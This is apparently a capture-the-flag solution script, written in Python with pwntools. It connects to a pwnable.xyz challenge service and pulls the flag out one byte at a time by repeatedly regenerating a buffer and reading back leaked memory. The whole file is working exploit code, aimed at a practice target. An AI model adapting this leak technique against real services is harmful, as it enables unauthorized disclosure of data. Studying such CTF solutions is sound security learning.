from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30006)

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def load():
	init(2)
	
def leak(option='y'):
	init(3)
	print(target.recvuntil("? "))
	target.sendline(option)
	leak=''
	if(option=='y'):
		print(target.recvuntil(": "))
		target.sendline("A")
	else:
		leak=target.recv(0x40)
	return leak
	
def regen(size):
	init(1)
	print(target.recvuntil(": "))
	target.sendline(str(size))

leak()
regen(0x40)
flag=""
# if timeout, do it in bits
for i in range(0x3f):
	regen(i+1)
	load()
	flag+=leak('n')[i+1]
	print(flag)

target.interactive()

	
	
